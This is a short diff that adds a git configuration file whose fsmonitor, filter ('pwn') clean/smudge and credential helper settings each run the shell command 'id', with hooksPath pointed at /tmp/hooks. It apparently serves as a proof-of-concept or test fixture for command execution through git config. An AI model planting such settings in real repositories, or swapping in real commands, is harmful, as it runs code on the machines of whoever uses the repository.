@@ -1,0 +1,8 @@
+[core]
+    fsmonitor = $(id)
+    hooksPath = /tmp/hooks
+[filter "pwn"]
+    clean = id
+    smudge = id
+[credential]
+    helper = !id
